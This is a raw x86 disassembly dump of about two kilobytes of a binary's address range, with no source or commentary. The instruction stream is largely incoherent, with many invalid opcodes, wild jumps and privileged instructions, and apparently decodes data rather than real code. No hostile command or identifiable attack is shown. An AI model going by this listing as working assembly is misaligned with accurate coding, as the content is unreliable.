  40a425:	(bad)  
  40a426:	add    WORD PTR [eax],ax
	...
  40a451:	add    bh,ah
  40a453:	je     0x40a413
  40a455:	push   0x3fcd0d
  40a45a:	xchg   DWORD PTR [ebp+esi*2-0x1acdf0f8],esp
  40a461:	push   DWORD PTR [eax-0x39]
  40a464:	data16 add dl,BYTE PTR [edi-0x97418c]
  40a46b:	int3   
  40a46c:	aas    
  40a46d:	add    bh,dl
  40a46f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a470:	jne    0x40a47a
  40a472:	das    
  40a473:	push   cs
  40a474:	in     al,0xff
  40a476:	xor    BYTE PTR [edi+0x1a],dh
  40a479:	mov    esp,0xc2c9a430
  40a47e:	outs   dx,DWORD PTR ds:[esi]
  40a47f:	push   edi
  40a480:	push   ebp
  40a481:	mov    eax,DWORD PTR [ebx-0x28]
  40a484:	ret    
  40a485:	cld    
  40a486:	mov    ebp,0x50096a57
  40a48b:	and    al,BYTE PTR [edi]
  40a48d:	call   0x3f8ab5
  40a492:	into   
  40a493:	adc    bh,bl
  40a495:	push   0x4d
  40a497:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a498:	jne    0x40a4a2
  40a49a:	jg     0x40a473
  40a49c:	(bad)  
  40a49d:	inc    DWORD PTR [eax]
  40a49f:	cmc    
  40a4a0:	and    edi,edi
  40a4a2:	push   0x4f
  40a4a4:	call   0xffe2951f
  40a4a9:	push   0xfffffff3
  40a4ab:	mov    eax,ds:0xf2af0875
  40a4b0:	std    
  40a4b1:	push   DWORD PTR [eax+0xfc75a1]
	...
  40a4df:	add    BYTE PTR [esi],bh
  40a4e1:	jmp    0x4b56acbd
  40a4e6:	popf   
  40a4e7:	(bad)  
  40a4e8:	stc    
  40a4e9:	retf   
  40a4ea:	inc    eax
  40a4eb:	add    al,0x3e
  40a4ed:	addr16 mov ebp,esp
  40a4f0:	push   esp
  40a4f1:	hlt    
  40a4f2:	jmp    0x2d68:0x4338924
  40a4f9:	rol    ebx,0xff
  40a4fc:	shl    BYTE PTR [edi+0x43],1
  40a4ff:	dec    eax
  40a500:	jg     0x40a4f6
  40a502:	push   0xffffffd2
  40a504:	adc    BYTE PTR [ecx-0x3f81f4a2],0xf7
  40a50b:	dec    edi
  40a50c:	mov    cl,0xc7
  40a50e:	repnz (bad) 
  40a510:	xor    edi,eax
  40a512:	mov    dl,0xfe
  40a514:	sub    edi,esp
  40a516:	push   0xffffff98
  40a518:	mov    ds:0xdfe85e39,al
  40a51d:	jge    0x40a57d
  40a51f:	call   DWORD PTR [esp+esi*8]
  40a522:	jmp    0x4d68:0x2b2e924
  40a529:	loope  0x40a4ee
  40a52b:	(bad)  
  40a52c:	fprem1 
  40a52e:	add    al,BYTE PTR [eax]
  40a530:	mov    esi,0x61bea25c
  40a535:	icebp  
  40a536:	or     al,al
  40a538:	sar    dh,cl
  40a53a:	mov    dl,0xfe
  40a53c:	retf   
  40a53d:	add    ebx,DWORD PTR [ebp+esi*2+0x3a]
  40a541:	inc    esp
  40a542:	pop    ebp
  40a543:	jne    0x40a545
	...
  40a56d:	add    BYTE PTR [esi],dh
  40a56f:	sbb    al,0xeb
  40a571:	jecxz  0x40a5ac
  40a573:	sbb    DWORD PTR [edx+esi*2-0xb],ebp
  40a577:	rcr    BYTE PTR [edi+edi*8-0x4d],0x24
  40a57c:	pop    esp
  40a57d:	jne    0x40a5b1
  40a57f:	pushf  
  40a580:	or     edx,DWORD PTR [edi+0x7f]
  40a583:	pop    ebx
  40a584:	jmp    0x919430e5
  40a589:	and    BYTE PTR [edx],0x2
  40a58c:	xchg   esi,eax
  40a58d:	dec    ebx
  40a58e:	cld    
  40a58f:	dec    esi
  40a590:	jmp    0x6a2f6a4b
  40a595:	dec    eax
  40a596:	bnd je 0x40a582
  40a599:	jmp    0xc3ca7d5
  40a59e:	(bad)  
  40a59f:	(bad)  [eax]
  40a5a1:	pop    ebp
  40a5a2:	(bad)  
  40a5a4:	stos   DWORD PTR es:[edi],eax
  40a5a5:	pop    edi
  40a5a6:	pop    bx
  40a5a8:	jmp    0x5db32e19
  40a5ad:	mov    dh,0x7e
  40a5af:	pop    ebx
  40a5b0:	dec    esi
  40a5b1:	xlat   BYTE PTR ds:[ebx]
  40a5b2:	inc    ecx
  40a5b3:	repz enter 0xb15c,0x1
  40a5b8:	rol    DWORD PTR [edx],1
  40a5ba:	ds bnd jbe 0x40a5aa
  40a5be:	mov    al,ds:0x9903a8a8
  40a5c3:	xchg   ecx,esi
  40a5c5:	imul   eax,DWORD PTR [eax],0x2
  40a5c8:	push   ds
  40a5c9:	pop    ebp
  40a5ca:	mov    DWORD PTR [edi+0x530b5d15],eax
  40a5d0:	add    DWORD PTR [edi+0x0],esi
	...
  40a5fb:	add    BYTE PTR [esi+0x7c4b0601],dh
  40a601:	push   esi
  40a602:	jmp    0x682f5abd
  40a607:	dec    eax
  40a608:	xchg   BYTE PTR [ecx],cl
  40a60a:	out    dx,al
  40a60b:	pop    esp
  40a60c:	retf   
  40a60d:	xchg   edi,eax
  40a60e:	in     eax,0xb3
  40a610:	push   eax
  40a611:	xchg   ebp,ebp
  40a613:	pop    esp
  40a614:	adc    ebx,DWORD PTR [esi]
  40a616:	and    ebx,eax
  40a618:	inc    ecx
  40a619:	stc    
  40a61a:	add    ah,BYTE PTR [ebp+0x43f25b3e]
  40a620:	inc    ecx
  40a621:	(bad)  
  40a622:	mov    al,ds:0x5b3e02
  40a627:	scas   al,BYTE PTR es:[edi]
  40a628:	clc    
  40a629:	or     BYTE PTR [eax],al
  40a62b:	jmp    0x2d08016d
  40a630:	jbe    0x40a632
  40a632:	pop    es
  40a633:	jmp    0x3411b75
  40a638:	cmp    dh,BYTE PTR [ebp+0x0]
  40a63b:	add    eax,DWORD PTR [edx-0x32]
  40a63e:	inc    esp
  40a63f:	jge    0x40a5ee
  40a641:	iret   
  40a642:	test   BYTE PTR [ebp-0x6e],dh
  40a645:	add    bh,bh
  40a647:	sbb    DWORD PTR [ebx-0xf91077a],eax
  40a64d:	add    al,0xe8
  40a64f:	gs fwait
  40a651:	pop    ebx
  40a652:	add    dl,dh
  40a654:	jge    0x40a5dd
  40a656:	add    eax,0x5a4640
  40a65b:	jmp    0xa8888805
	...
  40a688:	add    BYTE PTR [eax],al
  40a68a:	cmp    eax,0x15ed7500
  40a68f:	mov    ?,WORD PTR [esi-0x7454fdca]
  40a695:	sbb    eax,ecx
  40a697:	(bad)  
  40a698:	repz push ds
  40a69a:	repnz dec DWORD PTR [edi-0x45]
  40a69e:	adc    eax,0xe216be3e
  40a6a3:	rol    DWORD PTR [ecx+ebx*1+0x11ff0012],1
  40a6aa:	out    dx,al
  40a6ab:	(bad)  
  40a6ac:	(bad)  
  40a6ad:	(bad)  
  40a6ae:	push   esi
  40a6af:	add    BYTE PTR [edi+0x69],ah
  40a6b2:	stos   BYTE PTR es:[edi],al
  40a6b3:	fwait
  40a6b4:	add    dh,ch
  40a6b6:	mov    bl,0xb
  40a6b8:	mul    esi
  40a6ba:	cmc    
  40a6bb:	push   DWORD PTR [edx+ebp*4]
  40a6be:	jp     0x40a65b
  40a6c0:	add    cl,al
  40a6c2:	leave  
  40a6c3:	mov    ebp,0xd5cbcefe
  40a6c8:	jecxz  0x40a6ca
  40a6ca:	lock mov ds:0xf4176aff,eax
  40a6d0:	nop
  40a6d1:	push   edi
  40a6d2:	push   esi
  40a6d3:	push   edi
  40a6d4:	push   DWORD PTR [ebp-0x5429]
  40a6da:	fsubr  DWORD PTR [ecx-0x3d]
  40a6dd:	dec    eax
  40a6de:	push   esi
  40a6df:	push   edi
  40a6e0:	call   0xffe5115a
  40a6e5:	mov    DWORD PTR [edx+0x73],esp
  40a6e8:	idiv   edi
  40a6ea:	mov    eax,0x67fef0
	...
  40a717:	add    BYTE PTR [esi-0x34],ch
  40a71a:	aas    
  40a71b:	add    BYTE PTR [eax-0x16],ch
  40a71e:	out    dx,eax
  40a71f:	imul   DWORD PTR [eax-0x5c]
  40a722:	push   DWORD PTR ds:0x400f24
  40a728:	outs   dx,DWORD PTR ds:[esi]
  40a729:	int3   
  40a72a:	mov    ebx,0x84ce68ff
  40a72f:	call   0x6b404b44
  40a734:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a735:	repz cdq 
  40a737:	push   edi
  40a738:	(bad)  
  40a739:	pop    ebx
  40a73a:	push   DWORD PTR [ebp-0x5399]
  40a740:	push   0xe648c36a
  40a745:	pop    ebx
  40a746:	call   0xffe49184
  40a74b:	mov    DWORD PTR [edx],edx
  40a74d:	ja     0x40a746
  40a74f:	dec    DWORD PTR [eax-0x2e]
  40a752:	test   al,bl
  40a754:	jo     0x40a6fa
  40a756:	call   DWORD PTR [eax-0x31]
  40a759:	mov    edx,0xa4574156
  40a75e:	mov    ch,0xf0
  40a760:	push   eax
  40a761:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a762:	(bad)  
  40a763:	push   DWORD PTR [edx]
  40a765:	cwde   
  40a766:	dec    eax
  40a767:	inc    ecx
  40a768:	push   edi
  40a769:	jae    0x40a781
  40a76b:	mov    ebp,0xb5a293e
  40a770:	(bad)  
  40a771:	test   al,0xfd
  40a773:	xor    bl,0xbc
  40a776:	push   ecx
  40a777:	jmp    FWORD PTR [ecx]
  40a779:	stc    
  40a77a:	iret   
  40a77b:	sldt   WORD PTR [eax]
	...
  40a7a6:	and    DWORD PTR ds:0xc5fa858a,eax
  40a7ac:	pop    ecx
  40a7ad:	jmp    FWORD PTR [esi-0x14]
  40a7b0:	gs mov ecx,0x146dde09
  40a7b6:	xor    eax,0x8e05ceb4
  40a7bb:	fdiv   QWORD PTR [ecx]
  40a7bd:	mov    ecx,0x8541d5f1
  40a7c2:	or     al,BYTE PTR [esi-0xbb400a6]
  40a7c8:	add    al,BYTE PTR [eax]
  40a7ca:	mov    ebp,0xd1f75f2f
  40a7cf:	jne    0x40a7d4
  40a7d1:	je     0x40a836
  40a7d3:	jno    0x40a76d
  40a7d5:	in     al,dx
  40a7d6:	leave  
  40a7d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a7d8:	pop    edx
  40a7d9:	add    BYTE PTR [edx],dh
  40a7db:	mov    al,0x85
  40a7dd:	mov    ebp,0xff5a3da6
  40a7e2:	ds enter 0x67b5,0x3e
  40a7e7:	hlt    
  40a7e8:	imul   edi,DWORD PTR [esi-0x17f53867],0xff5a9de8
  40a7f2:	mov    DWORD PTR [edi+0x6581f767],esp
  40a7f8:	pop    edx
  40a7f9:	jne    0x40a841
  40a7fb:	pop    esp
  40a7fc:	lods   eax,DWORD PTR ds:[esi]
  40a7fd:	mov    dh,0x71
  40a7ff:	push   ebp
  40a800:	pop    edx
  40a801:	mov    ch,0x56
  40a803:	add    eax,0x7f61ff59
  40a808:	or     ebp,eax
	...
  40a832:	add    BYTE PTR [eax],al
  40a834:	mov    edx,0x51ff5a46
  40a839:	pop    ebx
  40a83a:	pushf  
  40a83b:	pusha  
  40a83c:	push   ecx
  40a83d:	(bad)  
  40a83e:	fstp   QWORD PTR [ecx-0x35]
  40a841:	push   edx
  40a842:	ror    DWORD PTR [edx+0x59cdfdf0],0xeb
  40a849:	cli    
  40a84a:	mov    ebp,0x33fe2959
  40a84f:	or     al,0x16
  40a851:	fstp   TBYTE PTR [esi+0x59]
  40a854:	sbb    esi,edi
  40a856:	jae    0x40a890
  40a858:	or     esi,edi
  40a85a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a85b:	pop    ecx
  40a85c:	xchg   ebx,eax
  40a85d:	push   ebx
  40a85e:	xchg   ecx,eax
  40a85f:	hlt    
  40a860:	retf   
  40a861:	std    
  40a862:	xchg   ebp,eax
  40a863:	pop    ecx
  40a864:	mov    bl,0xf6
  40a866:	xchg   ebp,eax
  40a867:	pop    ecx
  40a868:	icebp  
  40a869:	repnz sbb al,0x9b
  40a86c:	jmp    0xd2d0266e
  40a871:	add    eax,0x93e65976
  40a876:	xor    BYTE PTR [ecx-0x2f],bl
  40a879:	std    
  40a87a:	fwait
  40a87b:	ins    BYTE PTR es:[edi],dx
  40a87c:	sar    ebp,1
  40a87e:	pop    ebp
  40a87f:	ins    BYTE PTR es:[edi],dx
  40a880:	add    ah,al
  40a882:	push   ebp
  40a883:	pop    ecx
  40a884:	mov    ecx,0xb15148c7
  40a889:	std    
  40a88a:	push   eax
  40a88b:	adc    eax,0x593dfde7
  40a890:	jmp    0x40a89c
  40a892:	ds pop ecx
  40a894:	cdq    
  40a895:	repnz add BYTE PTR [ebx+0x0],bl
	...
  40a8c0:	add    BYTE PTR [eax],al
  40a8c2:	xchg   ecx,eax
  40a8c3:	std    
  40a8c4:	and    eax,0xd5f391bf
  40a8c9:	pop    ecx
  40a8ca:	cmp    ebp,0xf275cf15
  40a8d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a8d1:	sahf   
  40a8d2:	ds pop ebx
  40a8d4:	xor    BYTE PTR [esi+0x36],al
  40a8d7:	pop    ebx
  40a8d8:	xchg   esp,eax
  40a8d9:	mov    WORD PTR [edx-0x27],ss
  40a8dc:	jmp    FWORD PTR [edx+edi*8]
  40a8df:	jo     0x40a8e1
  40a8e1:	add    DWORD PTR [edx-0x2],0x74
  40a8e5:	icebp  
  40a8e6:	aad    0x40
  40a8e8:	mov    dh,0xde
  40a8ea:	out    0xd3,al
  40a8ec:	inc    esp
  40a8ed:	aad    0xc0
  40a8ef:	xchg   esi,eax
  40a8f0:	clc    
  40a8f1:	cmp    DWORD PTR [edx],esp
  40a8f3:	cwde   
  40a8f4:	push   edi
  40a8f5:	sub    BYTE PTR [edx+0x73],al
  40a8f8:	xor    DWORD PTR [esi],edx
  40a8fa:	std    
  40a8fb:	cld    
  40a8fc:	std    
  40a8fd:	cld    
  40a8fe:	adc    BYTE PTR [ebx-0x25a16bf],0xba
  40a905:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a906:	push   ax
  40a908:	rcl    BYTE PTR ds:0xe8688d0f,0x3d
  40a90f:	in     al,dx
  40a910:	mov    ebp,0x5005008e
  40a915:	xchg   al,bh
  40a917:	push   esp
  40a918:	call   0xff3cd08e
  40a91d:	or     DWORD PTR [edx-0x4791013d],0xb9f896
	...
  40a94f:	add    ch,dl
  40a951:	test   al,0x57
  40a953:	test   al,0x3d
  40a955:	jae    0x40a988
  40a957:	mov    esi,0x14fdfc7c
  40a95c:	sti    
  40a95d:	xchg   edx,eax
  40a95e:	inc    ecx
  40a95f:	jmp    0x3efbba79
  40a964:	push   es
  40a965:	push   eax
  40a966:	sar    BYTE PTR [ebp-0x14977372],0x3d
  40a96d:	in     al,dx
  40a96e:	mov    ebp,0x50047826
  40a973:	push   ds
  40a974:	jo     0x40a9ca
  40a976:	call   0xff3ce138
  40a97b:	add    esi,ebp
  40a97d:	ret    0xfe
  40a980:	inc    eax
  40a981:	lock bound edx,QWORD PTR [edi-0x6a]
  40a985:	pop    eax
  40a986:	push   DWORD PTR [ebp+0x5f]
  40a989:	jo     0x40aa02
  40a98b:	std    
  40a98c:	pusha  
  40a98d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a98e:	push   DWORD PTR [ebp+0x63]
  40a991:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a992:	jne    0x40a99c
  40a994:	outs   dx,DWORD PTR ds:[esi]
  40a995:	mov    ds:0x8e10ffb5,al
  40a99a:	ret    0x2704
  40a99d:	retf   
  40a99e:	mov    esp,ebp
  40a9a0:	xchg   esi,eax
  40a9a1:	fdivr  st(7),st
  40a9a4:	loopne 0x40a949
  40a9a6:	lea    eax,[ebp-0x2d]
  40a9a9:	(bad)  
  40a9aa:	std    
  40a9ab:	jne    0x40a9a0
  40a9ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a9ae:	xor    eax,0xff164fc3
  40a9b3:	out    0x0,eax
	...
  40a9dd:	add    BYTE PTR [ebp-0x23000045],al
  40a9e3:	xchg   edi,eax
  40a9e4:	jne    0x40ff90
  40a9ea:	cwde   
  40a9eb:	sbb    edi,esi
  40a9ed:	add    bh,dl
  40a9ef:	push   edi
  40a9f0:	add    bh,al
  40a9f2:	sub    ch,BYTE PTR [ebx+0x57e707ff]
  40a9f8:	push   0x0
  40a9fa:	in     eax,dx
  40a9fb:	push   edi
  40a9fc:	push   0x0
  40a9fe:	in     eax,dx
  40a9ff:	push   edi
  40aa00:	lea    eax,[ebp+0x1b]
  40aa03:	(bad)  
  40aa04:	mov    eax,DWORD PTR [ebp-0x73f5]
  40aa0a:	(bad)  
  40aa0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aa0c:	jne    0x40aa06
  40aa0e:	pusha  
  40aa0f:	sub    bh,bl
  40aa11:	call   0x4085a1
  40aa16:	pushf  
  40aa17:	xchg   edi,eax
  40aa18:	je     0x40aa1f
  40aa1a:	fild   DWORD PTR cs:[eax]
  40aa1d:	add    BYTE PTR [edi+0x3e489def],dl
  40aa23:	mov    bl,0x2
  40aa25:	(bad)  
  40aa26:	jmp    0x40aa45
  40aa28:	imul   esi,DWORD PTR [ebp+0x505754a5],0xffffffb5
  40aa2f:	popa   
  40aa30:	mov    DWORD PTR [ebp-0xaa03ae],eax
  40aa36:	out    dx,al
  40aa37:	fild   QWORD PTR [edx-0x5b]
  40aa3a:	test   esp,esi
  40aa3c:	push   ebp
  40aa3d:	mov    DWORD PTR [ebx+0xff4e21],edi
	...
  40aa6b:	add    BYTE PTR [ecx],bh
  40aa6d:	sbb    eax,0x2a31b75a
  40aa72:	jmp    0xae044c76
  40aa77:	inc    eax
  40aa78:	ds mov ecx,0xb211f08f
  40aa7e:	push   ebp
  40aa7f:	dec    DWORD PTR [ebx-0x3b]
  40aa82:	retf   0x3e40
  40aa85:	int3   
  40aa86:	pop    ecx
  40aa87:	mov    edx,0x858bda01
  40aa8c:	loop   0x40aa67
  40aa8e:	push   ebp
  40aa8f:	jmp    DWORD PTR [esp+eax*1-0x15]
  40aa93:	test   eax,0xff044391
  40aa98:	stos   DWORD PTR es:[edi],eax
  40aa99:	je     0x40aae9
  40aa9b:	(bad)  
  40aa9c:	fnstenv [ecx+0x10]
  40aa9f:	ret    
  40aaa0:	xchg   BYTE PTR [ebx+0x4],al
  40aaa3:	call   0xff966993
  40aaa8:	mov    bh,0x7f
  40aaaa:	idiv   DWORD PTR [bx+di-0x166f]
  40aaaf:	call   FWORD PTR [ecx]
  40aab1:	aad    0xad
  40aab3:	inc    eax
  40aab4:	mov    eax,ds:0x39a9f090
  40aaba:	push   esi
  40aabb:	call   DWORD PTR [ebx+0x45]
  40aabe:	retf   
  40aabf:	inc    eax
  40aac0:	ds pushf 
  40aac2:	xchg   esi,eax
  40aac3:	mov    edx,0x8c265b89
  40aac8:	mov    ebx,0x795615fb
  40aacd:	test   ecx,ebp
  40aacf:	jmp    0x40aad1
	...
  40aaf9:	add    BYTE PTR [ecx+0x6903a892],ch
  40aaff:	mov    al,0xf8
  40ab01:	dec    ebp
  40ab02:	popa   
  40ab03:	cli    
  40ab04:	std    
  40ab05:	(bad)  
  40ab07:	mov    ds:0xbc6603a8,eax
  40ab0c:	xor    dl,BYTE PTR [esi+0x49]
  40ab0f:	in     al,0x6b
  40ab11:	ins    BYTE PTR es:[edi],dx
  40ab12:	dec    ecx
  40ab13:	cli    
  40ab14:	fucomp st(2)
  40ab16:	cmp    DWORD PTR [edx+0x5b7eada3],eax
  40ab1c:	into   
  40ab1d:	(bad)  
  40ab1e:	repnz lds edx,FWORD PTR cs:[ebp+0x21]
  40ab23:	xor    BYTE PTR [edx-0x3ea48134],ch
  40ab29:	adc    esp,0xc38badf9
  40ab2f:	push   ss
  40ab30:	sahf   
  40ab31:	push   ebp
  40ab32:	add    esi,ebx
  40ab34:	pop    ebx
  40ab35:	pusha  
  40ab36:	icebp  
  40ab37:	stc    
  40ab38:	xchg   ebp,eax
  40ab39:	add    al,0x6a
  40ab3b:	sub    BYTE PTR [edx-0x69],0xda
  40ab3f:	icebp  
  40ab40:	test   DWORD PTR [ebp+0x3e],edx
  40ab43:	outs   dx,DWORD PTR ds:[esi]
  40ab44:	sbb    eax,0x7e029b81
  40ab49:	push   ebp
  40ab4a:	rcr    DWORD PTR [edx-0xb],1
  40ab4d:	mov    al,0x61
  40ab4f:	pop    ebx
  40ab50:	jmp    0xd43a2bb9
  40ab55:	or     esp,DWORD PTR [esi-0x4eaa65f8]
  40ab5b:	stc    
  40ab5c:	xchg   ebx,eax
  40ab5d:	push   0x0
	...
  40ab86:	add    BYTE PTR [eax],al
  40ab88:	mov    cl,0xf9
  40ab8a:	inc    ebp
  40ab8b:	push   ebp
  40ab8c:	sub    esp,DWORD PTR [ebx+0x51]
  40ab8f:	ret    0xf9cd
  40ab92:	push   DWORD PTR ds:0x36e7afeb
  40ab98:	repz stc 
  40ab9a:	(bad)  
  40ab9b:	pushf  
  40ab9c:	xor    eax,0x13553403
  40aba1:	cli    
  40aba2:	(bad)  
  40aba3:	pop    esp
  40aba4:	fdivrp st(1),st
  40aba6:	dec    BYTE PTR [esi]
  40aba8:	adc    esi,DWORD PTR [eax+0x8]
  40abab:	adc    DWORD PTR [eax-0x51],eax
  40abae:	(bad)  
  40abaf:	(bad)  
  40abb0:	repnz scas eax,DWORD PTR es:[edi]
  40abb2:	(bad)  
  40abb4:	jmp    0x1803:0x3574fef9
  40abbb:	popf   
  40abbc:	jmp    0xfef0:0x7194fef9
  40abc3:	(bad)  
  40abc4:	mov    ch,BYTE PTR [esi+0x8]
  40abc7:	shl    DWORD PTR [edi],0xaf
  40abca:	inc    dh
  40abcc:	mov    ch,BYTE PTR [esi-0x78d491d]
  40abd2:	out    0xc5,eax
  40abd4:	ret    
  40abd5:	clc    
  40abd6:	(bad)  
  40abd7:	scas   al,BYTE PTR es:[edi]
  40abd8:	mov    eax,0x6aa6f707
  40abdd:	add    esp,ecx
  40abdf:	push   edi
  40abe0:	xchg   edx,eax
  40abe1:	clc    
  40abe2:	(bad)  
  40abe3:	pop    esp
  40abe4:	lock dec BYTE PTR gs:[esi-0x7949eeab]
	...
  40ac14:	add    BYTE PTR [eax],al
  40ac16:	mov    bh,al
  40ac18:	mov    ah,0x89
  40ac1a:	mov    bh,al
  40ac1c:	inc    BYTE PTR [ecx+0x6efeb186]
  40ac22:	jb     0x40abd2
  40ac24:	fistp  DWORD PTR [esi+0x6a]
  40ac27:	clc    
  40ac28:	out    0x29,eax
  40ac2a:	retf   
  40ac2b:	clc    
  40ac2c:	(bad)  
  40ac2d:	push   esi
  40ac2e:	shr    bl,0xf6
  40ac31:	dec    esi
  40ac32:	adc    bh,al
  40ac34:	je     0x40ac36
  40ac36:	scas   eax,DWORD PTR es:[edi]
  40ac37:	test   BYTE PTR [edi],dh
  40ac39:	(bad)  
  40ac3a:	pop    eax
  40ac3b:	(bad)  
  40ac3c:	push   DWORD PTR [ebp-0x58a9]
  40ac42:	call   esi
  40ac44:	mov    ch,0xff
  40ac46:	pop    eax
  40ac47:	pop    DWORD PTR [ebp-0x8]
  40ac4a:	dec    esi
  40ac4b:	push   ds
  40ac4c:	std    
  40ac4d:	dec    DWORD PTR [eax-0x71]
  40ac50:	jne    0x40ac4e
  40ac52:	aas    
  40ac53:	fwait
  40ac54:	mov    ds:0xc2a55700,al
  40ac59:	or     BYTE PTR [edi-0x37],ah
  40ac5c:	mov    esp,ebp
  40ac5e:	in     al,0x37
  40ac60:	cld    
  40ac61:	push   0x57
  40ac63:	add    cl,BYTE PTR [ebx]
  40ac65:	jmp    edx
  40ac67:	mul    dh
  40ac69:	mov    ecx,0x89ff8bd4
  40ac6e:	bound  ecx,QWORD PTR [ebx+0x1e70d668]
  40ac74:	(bad)  
  40ac75:	(bad)  
  40ac76:	(bad)  
  40ac77:	mul    esi
  40ac79:	test   BYTE PTR [eax],0x0
	...
  40aca4:	fimul  DWORD PTR [ebx-0x74ad0001]
  40acaa:	push   DWORD PTR [ebp+0x1f]
  40acad:	xchg   esp,eax
  40acae:	in     al,0xb3
  40acb0:	fmul   DWORD PTR [ebx+0x5be3c2c9]
  40acb6:	push   ebp
  40acb7:	mov    edi,DWORD PTR [ebx-0x2f2f3c23]
  40acbd:	mov    edi,edi
  40acbf:	lea    edx,[edx]
  40acc1:	mov    edx,DWORD PTR [eax-0x1]
  40acc4:	shl    bh,cl
  40acc6:	std    
  40acc7:	xor    eax,0x3fb6a4
  40accc:	mov    edi,0xd700a125
  40acd1:	clc    
  40acd2:	mov    esi,0x269220f
  40acd7:	add    BYTE PTR [esi],bh
  40acd9:	add    cl,BYTE PTR [edx+0x45]
  40acdc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40acdd:	add    DWORD PTR [ebx],eax
  40acdf:	add    BYTE PTR [esi],bh
  40ace1:	dec    ecx
  40ace2:	leave  
  40ace3:	repz cdq 
  40ace5:	add    BYTE PTR [ebx],al
  40ace7:	add    BYTE PTR [edx+eax*1],ah
  40acea:	(bad)  
  40acec:	pop    ss
  40aced:	add    bl,ch
  40acef:	push   DWORD PTR [edx-0x34afa93a]
  40acf5:	jle    0x40ad4f
  40acf7:	div    DWORD PTR [ecx+0x50]
  40acfa:	mov    ah,0xfe
  40acfc:	repz dec ecx
  40acfe:	push   ebx
  40acff:	jne    0x40ad63
  40ad01:	dec    ecx
  40ad02:	mov    edi,0xfe023ea1
  40ad07:	mov    edi,0x0
	...
  40ad30:	add    BYTE PTR [eax],al
  40ad32:	retf   0x5c06
  40ad35:	std    
  40ad36:	aas    
  40ad37:	add    al,BYTE PTR [ebx]
  40ad39:	push   0xffc529a1
  40ad3e:	cmp    BYTE PTR [eax-0x342d1800],dl
  40ad44:	push   ecx
  40ad45:	push   DWORD PTR [ebp+0x2a857fb4]
  40ad4b:	mov    dh,0x51
  40ad4d:	jmp    FWORD PTR [esi+0x52]
  40ad50:	pop    esp
  40ad51:	loope  0x40ad2a
  40ad53:	lods   eax,DWORD PTR ds:[esi]
  40ad54:	push   ecx
  40ad55:	mov    ebx,eax
  40ad57:	mov    ah,0x59
  40ad59:	inc    DWORD PTR [ecx]
  40ad5b:	dec    ebx
  40ad5c:	add    al,0x68
  40ad5e:	sub    al,0x9c
  40ad60:	vlddqu ymm2,[edi-0x1a1608ad]
  40ad68:	push   ecx
  40ad69:	xor    eax,0xffc52cfd
  40ad6e:	loope  0x40ad3c
  40ad70:	mov    bh,bh
  40ad72:	sar    DWORD PTR [ebx-0x78],1
  40ad75:	in     al,0xd1
  40ad77:	test   DWORD PTR [edx+0x6a],edx
  40ad7a:	ds pop ebx
  40ad7c:	shl    DWORD PTR [esi],1
  40ad7e:	push   ss
  40ad7f:	pushf  
  40ad80:	jmp    0x5e2c98d7
  40ad85:	push   edx
  40ad86:	test   eax,0xf64713f6
  40ad8b:	fwait
  40ad8c:	jmp    0x3df431ec
  40ad91:	push   edx
  40ad92:	(bad)  
  40ad93:	loopne 0x40add9
  40ad95:	pop    edx
	...
  40adbe:	add    BYTE PTR [eax],al
  40adc0:	mov    esi,esi
  40adc2:	ret    0x1603
  40adc5:	inc    ebx
  40adc6:	rol    esp,0x79
  40adc9:	cmc    
  40adca:	push   ebx
  40adcb:	push   ebx
  40adcc:	imul   esi,esi,0x1a335215
  40add2:	mov    eax,ds:0x54fe61c4
  40add7:	mov    ebx,DWORD PTR [ecx-0xa]
  40adda:	outs   dx,DWORD PTR ds:[esi]
  40addb:	mov    BYTE PTR [esi-0x12],ah
  40adde:	cmc    
  40addf:	push   ecx
  40ade0:	aam    0x5a
  40ade2:	sbb    DWORD PTR [eax],0x50e99be6
  40ade8:	repz jmp 0x451b:0xf63151d5
  40adf0:	jbe    0x40ad8e
  40adf2:	jmp    0xc5f35e52
  40adf7:	push   ecx
  40adf8:	(bad)  
  40adf9:	(bad)  
  40adfb:	pop    ecx
  40adfc:	adc    esi,esi
  40adfe:	arpl   WORD PTR [edi+0x51adedf2],ax
  40ae04:	outs   dx,BYTE PTR ds:[esi]
  40ae05:	adc    esp,0xffffffab
  40ae08:	jle    0x40ae65
  40ae0a:	sahf   
  40ae0b:	xchg   edi,eax
  40ae0c:	out    dx,al
  40ae0d:	in     eax,dx
  40ae0e:	xchg   ebp,eax
  40ae0f:	push   ecx
  40ae10:	jmp    0x7efd5844
  40ae15:	pop    ebx
  40ae16:	xchg   ecx,eax
  40ae17:	fst    QWORD PTR [ecx-0x6e02820b]
  40ae1d:	outs   dx,BYTE PTR ds:[esi]
  40ae1e:	add    al,dl
  40ae20:	ret    0xd3b7
  40ae23:	jbe    0x40ae25
	...
  40ae4d:	add    BYTE PTR [edi-0xa],ch
  40ae50:	add    ebx,esp
  40ae52:	lods   eax,DWORD PTR ds:[esi]
  40ae53:	hlt    
  40ae54:	das    
  40ae55:	outs   dx,BYTE PTR ds:[esi]
  40ae56:	mov    ecx,0xf56f716
  40ae5b:	mov    ebp,eax
  40ae5d:	adc    ecx,ecx
  40ae5f:	cmc    
  40ae60:	(bad)  
  40ae61:	push   edx
  40ae62:	xchg   esi,eax
  40ae63:	pusha  
  40ae64:	shl    BYTE PTR [ebp+0x5e88b47],0xb1
  40ae6b:	cmc    
  40ae6c:	(bad)  
  40ae6d:	es mov ecx,0xf26f716
  40ae73:	push   eax
  40ae74:	add    cl,ch
  40ae76:	cmp    eax,0x73984e8
  40ae7b:	idiv   dh
  40ae7d:	mov    ecx,0xa8583385
  40ae82:	cmp    eax,0xf6f9b4f6
  40ae87:	cmc    
  40ae88:	(bad)  
  40ae89:	div    BYTE PTR [eax]
  40ae8b:	sbb    cl,BYTE PTR [eax-0x58]
  40ae8e:	cmp    eax,0x8ea11d03
